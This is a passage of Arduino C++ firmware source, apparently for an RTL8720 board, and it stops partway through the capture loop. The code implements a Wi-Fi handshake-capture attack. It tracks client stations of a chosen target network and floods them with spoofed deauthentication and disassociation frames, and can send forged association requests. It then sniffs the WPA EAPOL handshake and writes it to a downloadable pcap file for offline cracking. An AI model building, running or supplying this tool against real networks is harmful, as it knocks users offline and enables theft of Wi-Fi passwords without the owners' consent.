// Define a structure for storing handshake data.
#include <Arduino.h>
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

// Include WiFi custom transmission functions
#include "wifi_cust_tx.h"

uint8_t deauth_bssid[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint16_t deauth_reason;

bool readyToSniff = false;
bool sniffer_active = false;
bool isHandshakeCaptured = false;


std::vector<uint8_t> pcapData;

// Global flag to indicate that the sniff callback has been triggered.
volatile bool sniffCallbackTriggered = false;
// During dedicated management capture, allow storing any management frames
volatile bool allowAnyMgmtFrames = false;
static bool strictCaptureMode = true; // Only accept frames related to target BSSID, avoid false positives when no clients are present
// Cache of discovered client stations to target with unicast deauth
static volatile uint8_t knownClients[8][6];
static volatile uint8_t knownClientCount = 0;
// Timestamp (ms) when a client was last seen, for real-time detection and pruning stale clients
static volatile unsigned long knownClientLastSeenMs[8] = {0};
// Timestamp (ms) of the last observed AssocResp/ReassocResp success — strong evidence of "real network join"
static volatile unsigned long knownClientAuthAssocLastMs[8] = {0};
static volatile unsigned long knownClientAssocRespLastMs[8] = {0};

// Selected AP descriptor (shared with main sketch)
struct SelectedAP {
  String ssid;
  uint8_t bssid[6];
  int ch;
};
extern SelectedAP _selectedNetwork;
extern String AP_Channel;

static inline bool macEquals6(const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<6;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

static inline bool macEquals6v(volatile const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<6;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

static inline bool macIsUnicast(const uint8_t* mac) {
  return (mac[0] & 0x01) == 0;
}

static inline bool macIsLocallyAdmin(const uint8_t* mac) {
  return (mac[0] & 0x02) != 0;
}

// Compare two 8-byte replay counters for equality (big-endian)
static inline bool rcEquals(const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<8;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

// Check if next == prev + 1 (big-endian increment)
static inline bool rcIsPlusOne(const uint8_t* next, const uint8_t* prev) {
  uint8_t tmp[8]; for (int i=0;i<8;i++) tmp[i]=prev[i];
  // Big-endian +1
  for (int i=7;i>=0;i--) { uint16_t v = (uint16_t)tmp[i] + 1; tmp[i] = (uint8_t)(v & 0xFF); if ((v & 0x100) == 0) break; }
  for (int i=0;i<8;i++){ if (next[i]!=tmp[i]) return false; }
  return true;
}

// Local helper: MAC -> String (declare early so it can be used below)
static inline String macToString(const uint8_t* mac, int len) {
  char buf[3*6];
  int n = 0;
  for (int i=0;i<len;i++) {
    n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]);
  }
  return String(buf);
}

static void addKnownClient(const uint8_t* mac) {
  if (!mac) return;
  // Ignore broadcast/multicast
  bool isBroadcast = true; for (int i=0;i<6;i++){ if (mac[i] != 0xFF) { isBroadcast=false; break; } }
  if (isBroadcast) return;
  // Ignore if equals BSSID
  if (macEquals6(mac, _selectedNetwork.bssid)) return;
  // Deduplicate
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientLastSeenMs[i] = millis(); return; }
  }
  if (knownClientCount < 8) {
    for (int i=0;i<6;i++) knownClients[knownClientCount][i] = mac[i];
    knownClientCount++;
    knownClientLastSeenMs[knownClientCount - 1] = millis();
    knownClientAuthAssocLastMs[knownClientCount - 1] = 0;
    Serial.print(F("[ClientCache] Added STA ")); Serial.println(macToString(mac,6));
  }
}

// Touch (refresh) the last-seen time of a known client
static inline void touchKnownClient(const uint8_t* mac) {
  if (!mac) return;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientLastSeenMs[i] = millis(); return; }
  }
}

// Record the last-seen time of an Auth/Assoc/Reassoc frame
static inline void markAuthAssocSeen(const uint8_t* mac) {
  if (!mac) return;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientAuthAssocLastMs[i] = millis(); return; }
  }
}

// Find the index of a MAC in the known client table, return 255 if not found
static inline uint8_t findKnownClientIndex(const uint8_t* mac) {
  if (!mac) return 255;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) return i;
  }
  return 255;
}

// Prune clients not seen for longer than the given duration, avoid sending invalid frames to offline devices
static void pruneStaleKnownClients(unsigned long maxAgeMs) {
  unsigned long now = millis();
  uint8_t i = 0;
  while (i < knownClientCount && i < 8) {
    unsigned long last = knownClientLastSeenMs[i];
    if (last != 0 && (now - last) > maxAgeMs) {
      // Delete the i-th entry: overwrite with the last and decrement count
      uint8_t lastIdx = knownClientCount - 1;
      if (i != lastIdx) {
        for (int b=0;b<6;b++) knownClients[i][b] = knownClients[lastIdx][b];
        knownClientLastSeenMs[i] = knownClientLastSeenMs[lastIdx];
      }
      knownClientCount--;
    } else {
      i++;
    }
  }
}

// Global handshake packet data storage, ensures data is not lost
std::vector<uint8_t> globalPcapData;
bool handshakeDataAvailable = false;
// WebUI metadata: last successful capture stats and time (used for download area display and prompt popup)
volatile bool handshakeJustCaptured = false;
volatile unsigned long lastCaptureTimestamp = 0;
volatile uint8_t lastCaptureHSCount = 0;
volatile uint8_t lastCaptureMgmtCount = 0;
// Debug control (unified switch, verbose logging off by default)
static bool g_verboseHandshakeLog = false;

// Provide a unified toggle interface for external on/off control
static inline void setVerboseHandshakeLog(bool enabled) { g_verboseHandshakeLog = enabled; }
static unsigned long g_promiscEnabledMs = 0;
// Capture mode: 0=ACTIVE, 1=PASSIVE, 2=EFFICIENT
#define CAPTURE_MODE_ACTIVE 0
#define CAPTURE_MODE_PASSIVE 1
#define CAPTURE_MODE_EFFICIENT 2
static int g_captureMode = CAPTURE_MODE_ACTIVE;
// Control whether capture flow actively sends deauth/disassoc during sniff (ACTIVE only)
static bool g_captureDeauthEnabled = true;

// Pcap capture state machine definitions
enum CaptureState {
  CAPTURE_STATE_IDLE,           // Idle
  CAPTURE_STATE_INIT,           // Initializing
  CAPTURE_STATE_PRE_DEAUTH,     // Pre-trigger deauthentication
  CAPTURE_STATE_DEAUTH_PHASE,   // Deauthentication phase
  CAPTURE_STATE_SNIFF_PHASE,    // Sniffing phase
  CAPTURE_STATE_EFFICIENT_BURST,// Efficient mode burst
  CAPTURE_STATE_MGMT_CAPTURE,   // Management frame capture
  CAPTURE_STATE_COMPLETE        // Complete
};

// State machine variables
static CaptureState g_captureState = CAPTURE_STATE_IDLE;
static unsigned long g_captureStateStartTime = 0;
static unsigned long g_overallCaptureStartTime = 0;
static int g_captureAttempts = 0;
static unsigned long g_lastBurstTime = 0;
static unsigned long g_lastChannelCheckTime = 0;
static unsigned long g_preDeauthPacketCount = 0;
static unsigned long g_deauthPacketCount = 0;
static bool g_promiscEnabled = false;

// (helper already defined above)

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
  unsigned long timestamp;  // Timestamp for duplicate detection
  unsigned short sequence;  // Sequence number for duplicate detection
  uint8_t messageType;      // 0=unknown, 1=M1, 2=M2, 3=M3, 4=M4
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

// Helper function: returns the offset at which the EAPOL payload starts
// Find the offset where the LLC+EAPOL signature starts.
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) {
        match = false;
        break;
      }
    }
    if (match) return i;
  }
  return 0; // if not found, return 0 (compare full frame)
}

// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

// Parsed EAPOL information helper
struct ParsedEapolInfo {
  bool found;
  unsigned int llcOffset;      // offset of AA AA 03 ... 88 8E
  uint8_t version;             // EAPOL version
  uint8_t eapolType;           // 3 = Key
  uint16_t eapolLen;           // length field
  uint8_t descriptorType;      // 1 or 2
  uint16_t keyInfo;            // big-endian
  uint16_t keyLength;
  uint8_t replayCounter[8];
  bool hasMic;
  bool hasAck;
  bool hasInstall;
  bool hasSecure;
  bool isFromAP;               // based on source MAC == BSSID
};

// Extract DA/SA/BSSID for data frames using ToDS/FromDS
static inline bool extractAddrsForDataFrame(const unsigned char *packet, unsigned int length,
                                            const uint8_t* &da, const uint8_t* &sa, const uint8_t* &bssid) {
  if (length < 24) return false;

  // Frame Control + Duration (first 4 bytes). Base 3-address header = 24 bytes.
  uint16_t fc = packet[0] | (packet[1] << 8);
  bool toDS = (fc & (1 << 8)) != 0;
  bool fromDS = (fc & (1 << 9)) != 0;
  bool isQoS = ((fc & 0x0080) != 0); // QoS Data subtype bit

  // Fixed positions for 3-address frames
  const uint8_t* a1 = &packet[4];   // Addr1
  const uint8_t* a2 = &packet[10];  // Addr2
  const uint8_t* a3 = &packet[16];  // Addr3

  // Map addresses per IEEE 802.11
  // - ToDS=0, FromDS=0 (IBSS):      A1=DA,    A2=SA,   A3=BSSID
  // - ToDS=0, FromDS=1 (AP->STA):   A1=DA,    A2=BSSID, A3=SA
  // - ToDS=1, FromDS=0 (STA->AP):   A1=BSSID, A2=SA,   A3=DA
  // - ToDS=1, FromDS=1 (WDS): 4-address, ignore for handshake attribution
  if (!toDS && !fromDS) {
    da = a1; sa = a2; bssid = a3; return true;
  }
  if (!toDS && fromDS) {
    da = a1; sa = a3; bssid = a2; return true;
  }
  if (toDS && !fromDS) {
    da = a3; sa = a2; bssid = a1; return true;
  }
  // 4-address (WDS/mesh/backhaul). Addr4 present at offset 24 (or 30 if QoS present).
  unsigned int minLen4 = isQoS ? 32 : 30;
  if (length < minLen4) return false;
  return false; // do not use 4-address frames
}

bool parseEapol(const unsigned char *packet, unsigned int length, ParsedEapolInfo &out) {
  out = {};
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i + sig_len < length; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) { match = false; break; }
    }
    if (!match) continue;
    // Offsets per 802.1X EAPOL Key
    unsigned int off = i + sig_len; // points at EAPOL header
    if (off + 4 > length) continue;
    uint8_t ver = packet[off + 0];
    uint8_t typ = packet[off + 1];
    uint16_t elen = ((uint16_t)packet[off + 2] << 8) | packet[off + 3];
    if (typ != 3) continue; // Only handle EAPOL-Key
    if (off + 5 > length) continue;
    uint8_t descType = packet[off + 4];
    if (off + 7 > length) continue;
    uint16_t keyInfo = ((uint16_t)packet[off + 5] << 8) | packet[off + 6];
    if (off + 9 > length) continue;
    uint16_t keyLen = ((uint16_t)packet[off + 7] << 8) | packet[off + 8];
    if (off + 17 > length) continue; // replay counter end
    uint8_t rc[8];
    for (int k = 0; k < 8; k++) rc[k] = packet[off + 9 + k];

    out.found = true;
    out.llcOffset = i;
    out.version = ver;
    out.eapolType = typ;
    out.eapolLen = elen;
    out.descriptorType = descType;
    out.keyInfo = keyInfo;
    out.keyLength = keyLen;
    memcpy(out.replayCounter, rc, 8);
    out.hasMic = (keyInfo & (1 << 8)) != 0;      // MIC bit
    out.hasAck = (keyInfo & (1 << 7)) != 0;      // ACK bit
    out.hasInstall = (keyInfo & (1 << 6)) != 0;  // Install bit
    out.hasSecure = (keyInfo & (1 << 9)) != 0;   // Secure bit

    // Direction by MAC: use 802.11 header layout (Addr2@10=SA, Addr1@4=DA)
    bool saIsBssid = false, daIsBssid = false;
    if (length >= 16) { saIsBssid = true; for (int j=0;j<6;j++){ if (packet[10+j] != _selectedNetwork.bssid[j]) { saIsBssid=false; break; } } }
    if (!saIsBssid && length >= 10) { daIsBssid = true; for (int j=0;j<6;j++){ if (packet[4+j] != _selectedNetwork.bssid[j]) { daIsBssid=false; break; } } }
    if (saIsBssid) out.isFromAP = true; else if (daIsBssid) out.isFromAP = false; else out.isFromAP = saIsBssid;
    return true;
  }
  return false;
}

// Fallback parser: when only 0x88 0x8E is found (no full LLC SNAP),
// treat EAPOL header as starting right after ethertype.
bool parseEapolFromEthertype(const unsigned char *packet, unsigned int length, ParsedEapolInfo &out) {
  out = {};
  for (unsigned int i = 0; i + 2 < length; i++) {
    if (packet[i] == 0x88 && packet[i + 1] == 0x8E) {
      unsigned int off = i + 2; // EAPOL header start
      if (off + 5 > length) continue;
      uint8_t ver = packet[off + 0];
      uint8_t typ = packet[off + 1];
      uint16_t elen = ((uint16_t)packet[off + 2] << 8) | packet[off + 3];
      if (typ != 3) continue;
      if (off + 5 > length) continue;
      uint8_t descType = packet[off + 4];
      if (off + 7 > length) continue;
      uint16_t keyInfo = ((uint16_t)packet[off + 5] << 8) | packet[off + 6];
      if (off + 17 > length) continue;
      uint16_t keyLen = ((uint16_t)packet[off + 7] << 8) | packet[off + 8];
      uint8_t rc[8]; for (int k=0;k<8;k++) rc[k] = packet[off + 9 + k];

      out.found = true;
      out.llcOffset = i; // points at ethertype
      out.version = ver;
      out.eapolType = typ;
      out.eapolLen = elen;
      out.descriptorType = descType;
      out.keyInfo = keyInfo;
      out.keyLength = keyLen;
      memcpy(out.replayCounter, rc, 8);
      out.hasMic = (keyInfo & (1 << 8)) != 0;
      out.hasAck = (keyInfo & (1 << 7)) != 0;
      out.hasInstall = (keyInfo & (1 << 6)) != 0;
      out.hasSecure = (keyInfo & (1 << 9)) != 0;
      bool saIsBssid = false, daIsBssid = false;
      if (length >= 16) { saIsBssid = true; for (int j=0;j<6;j++){ if (packet[10+j] != _selectedNetwork.bssid[j]) { saIsBssid=false; break; } } }
      if (!saIsBssid && length >= 10) { daIsBssid = true; for (int j=0;j<6;j++){ if (packet[4+j] != _selectedNetwork.bssid[j]) { daIsBssid=false; break; } } }
      if (saIsBssid) out.isFromAP = true; else if (daIsBssid) out.isFromAP = false; else out.isFromAP = saIsBssid;
      return true;
    }
  }
  return false;
}

ManagementData capturedManagement;

// --- PCAP Structures ---
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// --- External Variables ---
// These are defined in your main file.
extern struct HandshakeData capturedHandshake;
extern struct ManagementData capturedManagement;
extern volatile bool g_attackStop;
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param);

// Pause/resume promiscuous capture around deauth transmissions
static inline void pauseCaptureForDeauth() {
  // Skip operation on user stop request to avoid blocking
  if (g_attackStop) return;
  Serial.println(F("[Deauth] Pausing capture (disable promiscuous)..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(10);  // Shortened delay
}
static inline void resumeCaptureAfterDeauth(unsigned long waitMs) {
  // Skip operation on user stop request to avoid blocking
  if (g_attackStop) return;
  Serial.print(F("[Deauth] Waiting ")); Serial.print(waitMs); Serial.println(F("ms before resuming capture..."));
  delay(waitMs);
  Serial.println(F("[Deauth] Resuming capture (enable promiscuous)..."));
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  delay(10);  // Shortened delay
}
// Forward declaration so it's available to helpers defined earlier
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype);

// Parse Association/Reassociation Response status code (0 = success)
static inline bool parseAssocRespStatus(const unsigned char *packet, unsigned int length, uint16_t &statusOut) {
  if (!packet || length < 24 + 4) return false;
  unsigned int type, subtype; get_frame_type_subtype(packet, type, subtype);
  if (type != 0) return false; // not mgmt
  if (!(subtype == 1 || subtype == 3)) return false; // not AssocResp/ReassocResp
  // Body starts at offset 24: [Capabilities(2)] [Status(2)] [AID(2)] ...
  if (length < 24 + 4) return false;
  statusOut = (uint16_t)packet[24 + 2] | ((uint16_t)packet[24 + 3] << 8);
  return true;
}

// Minimal Radiotap header (8 bytes)
const uint8_t minimal_rtap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};


std::vector<uint8_t> generatePcapBuffer() {
  pcapData.clear();

  // Build and append the global header.
  PcapGlobalHeader gh;
  gh.magic_number = 0xa1b2c3d4; // Little-endian magic number
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = 65535;
  gh.network = 127; // DLT_IEEE802_11_RADIO

  uint8_t* ghPtr = (uint8_t*)&gh;
  for (size_t i = 0; i < sizeof(gh); i++) {
    pcapData.push_back(ghPtr[i]);
  }

  // Helper lambda to write one packet.
  auto writePacket = [&](const uint8_t* packetData, size_t packetLength) {
    PcapPacketHeader ph;
    unsigned long ms = millis();
    ph.ts_sec = ms / 1000;
    ph.ts_usec = (ms % 1000) * 1000;
    ph.incl_len = packetLength + sizeof(minimal_rtap);
    ph.orig_len = packetLength + sizeof(minimal_rtap);

    uint8_t* phPtr = (uint8_t*)&ph;
    for (size_t i = 0; i < sizeof(ph); i++) {
      pcapData.push_back(phPtr[i]);
    }
    // Append Radiotap header.
    for (size_t i = 0; i < sizeof(minimal_rtap); i++) {
      pcapData.push_back(minimal_rtap[i]);
    }
    // Append packet data.
    for (size_t i = 0; i < packetLength; i++) {
      pcapData.push_back(packetData[i]);
    }
  };

  // Write handshake frames.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    writePacket(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length);
  }
  // Write management frames.
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    writePacket(capturedManagement.frames[i].data, capturedManagement.frames[i].length);
  }

  return pcapData;
}

// Function to reset both handshake and management frame data.
void resetCaptureData() {
  //std::vector<uint8_t> pcapData;
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}

// Function to reset global handshake data
void resetGlobalHandshakeData() {
  globalPcapData.clear();
  handshakeDataAvailable = false;
  isHandshakeCaptured = false;
  handshakeJustCaptured = false;
  lastCaptureTimestamp = 0;
  lastCaptureHSCount = 0;
  lastCaptureMgmtCount = 0;
  Serial.println(F("Global handshake data reset"));
}

// Handshake integrity check function declaration
bool isHandshakeComplete();
bool isHandshakeCompleteQuickCapture();
bool hasBothHandshakeDirections();

void printHandshakeData() {
  Serial.println(F("---- Captured Handshake Data ----"));
  Serial.print(F("Total handshake frames captured: "));
  Serial.println(capturedHandshake.frameCount);
  Serial.print(F("Total management frames captured: "));
  Serial.println(capturedManagement.frameCount);
  
  // Display target network information
  Serial.println(F("---- Target Network Information ----"));
  Serial.print(F("SSID: "));
  Serial.println(_selectedNetwork.ssid);
  Serial.print(F("BSSID: "));
  Serial.println(macToString(_selectedNetwork.bssid, 6));
  Serial.print(F("Channel: "));
  Serial.println(_selectedNetwork.ch);
  Serial.println(F("---- End of Target Network Information ----"));
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print(F("Handshake Frame "));
    Serial.print(i + 1);
    Serial.print(F(" ("));
    Serial.print(hf.length);
    Serial.println(F(" bytes):"));
    
    // Display MAC address information (correctly parsed based on DS bits)
    if (hf.length >= 24) {
      uint16_t fc = hf.data[0] | (hf.data[1] << 8);
      bool toDS = (fc & (1 << 8)) != 0;
      bool fromDS = (fc & (1 << 9)) != 0;

      const uint8_t *da = nullptr, *sa = nullptr, *bssid = nullptr;
      if (!extractAddrsForDataFrame(hf.data, hf.length, da, sa, bssid)) {
        // Fall back to fixed offsets
        da = &hf.data[4];
        sa = &hf.data[10];
        bssid = &hf.data[16];
      }

      Serial.print(F("FC=0x")); Serial.print(fc, HEX);
      Serial.print(F(" toDS=")); Serial.print(toDS);
      Serial.print(F(" fromDS=")); Serial.println(fromDS);

      Serial.print(F("DA=")); Serial.println(macToString(da, 6));
      Serial.print(F("SA=")); Serial.println(macToString(sa, 6));
      Serial.print(F("BSSID=")); Serial.println(macToString(bssid, 6));

      bool bssidMatch = true;
      for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      Serial.print(F("BSSID Match: ")); Serial.println(bssidMatch ? F("YES") : F("NO"));

      // Display the frame-determined message type (if already populated)
      if (hf.messageType >= 1 && hf.messageType <= 4) {
        Serial.print(F("Message Type: M")); Serial.println(hf.messageType);
      }

      // Display target BSSID for comparison
      Serial.print(F("Target BSSID: "));
      Serial.println(macToString(_selectedNetwork.bssid, 6));
    }
    
    // Print hex data in a formatted manner.
    for (unsigned int j = 0; j < hf.length; j++) {
      // Print a newline every 16 bytes with offset
      if (j % 16 == 0) {
        Serial.println();
        Serial.print(F("0x"));
        Serial.print(j, HEX);
        Serial.print(F(": "));
      }
      // Print leading zero if needed.
      if (hf.data[j] < 16) {
        Serial.print(F("0"));
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println(F("--------------------------------"));
  }
  
  // Display management frame information
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ManagementFrame &mf = capturedManagement.frames[i];
    Serial.print(F("Management Frame "));
    Serial.print(i + 1);
    Serial.print(F(" ("));
    Serial.print(mf.length);
    Serial.println(F(" bytes):"));
    
    // Display MAC address information
    if (mf.length >= 12) {
      Serial.print(F("Source MAC: "));
      Serial.println(macToString(&mf.data[6], 6));
      Serial.print(F("Destination MAC: "));
      Serial.println(macToString(&mf.data[0], 6));
      Serial.print(F("BSSID: "));
      Serial.println(macToString(&mf.data[10], 6));
    }
    
    Serial.println(F("--------------------------------"));
  }
  
  Serial.println(F("---- End of Handshake Data ----"));
}

void deauthAndSniff_legacy() {
  sniffer_active = true;
  // Reset capture buffers.
  resetCaptureData();

  // Stop existing packet detection to avoid conflicts
  if (g_verboseHandshakeLog) Serial.println(F("Stopping existing packet detection..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(200); // Increase wait time to ensure promiscuous mode is fully disabled
  
  // Ensure WiFi is in the correct state
  WiFi.disablePowerSave(); // Disable power saving to ensure stable packet capture

  memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
  
  // Output target network information for debugging
  if (g_verboseHandshakeLog) {
    Serial.print(F("Target network: "));
    Serial.print(_selectedNetwork.ssid);
    Serial.print(F(" ("));
    Serial.print(macToString(_selectedNetwork.bssid, 6));
    Serial.print(F(") on channel "));
    Serial.println(_selectedNetwork.ch);
  }
  
  // Check if the target network is valid
  if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
    Serial.println(F("ERROR: Invalid target network selected!"));
    sniffer_active = false;
    readyToSniff = false;
    return;
  }
  
  // Set the channel to the target AP's channel.
  if (g_verboseHandshakeLog) { Serial.print(F("Setting channel to: ")); Serial.println(_selectedNetwork.ch); }
  int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
  if (g_verboseHandshakeLog) { Serial.print(F("Channel set result: ")); Serial.println(channelResult); }
  
  // Wait for channel switch to complete
  delay(100);

// Pre-inducement: broadcast a burst of deauth frames before capture, then wait an appropriate duration before starting capture
  if (g_captureMode != CAPTURE_MODE_PASSIVE) {
    Serial.println(F("[PreDeauth] Burst broadcast deauth before starting capture"));
    // Combine common reason codes, send in batches
    const uint16_t reasons[] = {7, 1};
    for (int r = 0; r < 2; r++) {
      // Send several frames per reason code (moderate total to avoid prolonged blocking)
      wifi_tx_broadcast_deauth(deauth_bssid, reasons[r], 60, 200);
    }
    // A small number of disassociation frames
    wifi_tx_broadcast_disassoc(deauth_bssid, 8, 10, 300);
    // Wait for AP and STA state convergence: efficient mode 2000ms, other modes 3000ms
    if (g_captureMode == CAPTURE_MODE_EFFICIENT) delay(2000); else delay(3000);
  } else {
    Serial.println(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
  }

  // Overall timeout for the entire cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 60000; // Increase timeout to 60 seconds
  
  // Phase durations - adjust time intervals to improve handshake trigger probability
  const unsigned long deauthInterval = 1500; // Shorten base deauth phase to reduce disturbance
  unsigned long sniffInterval = 7000;        // Base sniff time (slightly extended to capture reconnections)
  
  // bool cancelled = false; // not used
  
  // Enable promiscous mode BUT keep SoftAP active
  if (g_verboseHandshakeLog) Serial.println(F("Enabling promiscuous mode for handshake capture..."));
  int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  if (g_verboseHandshakeLog) { Serial.print(F("Promiscuous mode result: ")); Serial.println(promiscResult); }
  
  // Wait for promiscuous mode to start
  delay(200);
  g_promiscEnabledMs = millis();
  
  // Active inducement (disabled in strict mode to avoid false positives from fake clients)
  if (!strictCaptureMode) {
    uint8_t baitSta[6];
    baitSta[0] = 0x02; // locally administered, unicast
    baitSta[1] = random(256);
    baitSta[2] = random(256);
    baitSta[3] = random(256);
    baitSta[4] = random(256);
    baitSta[5] = random(256);
    addKnownClient(baitSta);
    Serial.print(F("[Bait] Send auth/assoc from STA ")); Serial.println(macToString(baitSta,6));
    // Send authentication and association requests
    wifi_tx_auth_req(baitSta, _selectedNetwork.bssid);
    delay(10);
    wifi_tx_assoc_req(baitSta, _selectedNetwork.bssid, _selectedNetwork.ssid.c_str());
  }
  
// Improved capture loop
  int captureAttempts = 0;
  const int maxCaptureAttempts = 10;
  
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount < 3) &&
         ((g_captureMode == CAPTURE_MODE_EFFICIENT) || (millis() - overallStart < overallTimeout)) &&
         ((g_captureMode == CAPTURE_MODE_EFFICIENT) || (captureAttempts < maxCaptureAttempts))) {
    
    // Reduce channel switch frequency to avoid affecting WebUI connections
    static unsigned long lastChannelCheck = 0;
    if (millis() - lastChannelCheck > 5000) { // Check channel every 5 seconds
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      lastChannelCheck = millis();
    }

// ----- Deauth Phase -----
    if (g_captureMode == CAPTURE_MODE_ACTIVE) {
    if (g_verboseHandshakeLog) Serial.println(F("Starting deauth phase..."));
      // Pause capture while sending deauth
      pauseCaptureForDeauth();
      unsigned long deauthPhaseStart = millis();
      int deauthPacketCount = 0;
      
      if (g_verboseHandshakeLog) { Serial.print(F("Target BSSID: ")); Serial.println(macToString(deauth_bssid, 6)); }
      
      {
        const int maxDeauthPerPhase = 1200; // Limit single-round transmission to avoid excessive interference
        while ((millis() - deauthPhaseStart < deauthInterval) && (deauthPacketCount < maxDeauthPerPhase)) {      
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
        // Keep a longer time window in the deauth phase to avoid prematurely pruning newly learned clients
        pruneStaleKnownClients(15000);
        
        if (knownClientCount > 0) {
          DeauthFrame frame;
          memcpy(&frame.source, deauth_bssid, 6);
          memcpy(&frame.access_point, deauth_bssid, 6);
          // Reduce log noise to avoid affecting capture
          uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
          for (uint8_t k = 0; k < localKnownCount; k++) {
            const uint8_t *sta = (const uint8_t*)knownClients[k];
            memcpy(&frame.destination, sta, 6);
            // Send small bursts to known clients: multi-reason-code combo for better compatibility
            const uint16_t reasons[3] = {7, 1, 4};
            for (int r = 0; r < 3; r++) {
              frame.reason = reasons[r];
              for (int i = 0; i < 3; i++) { wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); deauthPacketCount++; delayMicroseconds(200); }
            }
          }
        } else {
          // No known clients: use extremely lightweight broadcast deauth/disassoc to wake STAs for later learning
          // Control transmission volume to avoid affecting capture and AP stability
          const uint16_t reasonsD[2] = {7, 1};
          for (int r = 0; r < 2 && deauthPacketCount < maxDeauthPerPhase; r++) {
            wifi_tx_broadcast_deauth(deauth_bssid, reasonsD[r], 2, 500);
            deauthPacketCount += 2;
          }
          // Optional: one lightweight disassociation
          wifi_tx_broadcast_disassoc(deauth_bssid, 8 /*inactivity*/, 1, 500);
          deauthPacketCount += 1;
        }
        }
      }
      
      if (g_verboseHandshakeLog) { Serial.print(F("Sent ")); Serial.print(deauthPacketCount); Serial.println(F(" deauth packets")); }
// Resume capture quickly to avoid missing immediate M1
      resumeCaptureAfterDeauth(120);
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
    } else {
      Serial.println(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
    }

    // ----- Sniff Phase -----
      if (g_verboseHandshakeLog) Serial.println(F("Starting sniff phase..."));

    if (promiscResult != 0) {
      if (g_verboseHandshakeLog) Serial.println(F("Re-enabling promiscuous mode..."));
      wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
    }
    
    unsigned long sniffPhaseStart = millis();
    unsigned long lastBurstTs = sniffPhaseStart;
    if (g_captureMode == CAPTURE_MODE_EFFICIENT) { sniffInterval = 15000; }

